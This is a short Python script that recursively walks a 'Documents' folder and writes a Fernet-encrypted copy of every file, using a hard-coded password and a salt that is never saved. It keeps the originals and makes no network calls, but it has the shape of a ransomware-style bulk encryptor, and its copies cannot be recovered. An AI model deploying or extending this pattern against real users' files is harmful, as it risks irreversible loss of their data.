# Import the necessary modules
import os
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
# Generate a password for the encryption
password = "NicNeko"

# Generate a salt for the encryption
salt = os.urandom(16)

# Generate a key using the PBKDF2 HMAC algorithm
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
)

key = base64.urlsafe_b64encode(kdf.derive(password.encode("utf-8")))

# Create a Fernet object using the generated key
fernet = Fernet(key)

# Recursively traverse the "Documents" directory
for root, dirs, files in os.walk("Documents"):
    # Print the directories and files in the current directory
    print("Root directory:", root)
    print("Directories:", dirs)
    print("Files:", files)

    # Encrypt each file in the directory
    for filename in files:
        print("Encrypting file:", filename)
        # Open the file
        file = open(os.path.join(root, filename), "rb")

        # Read the file data
        file_data = file.read()

        try:
            # Encrypt the file data
            encrypted_data = fernet.encrypt(file_data)
        except Exception as e:
            # Print any errors that occur
            print("Error encrypting file:", e)
            continue

        # Write the encrypted data to a new file
        with open(os.path.join(root, filename + ".encrypted"), "wb") as out_file:
            out_file.write(encrypted_data)

        # Close the file
        file.close()
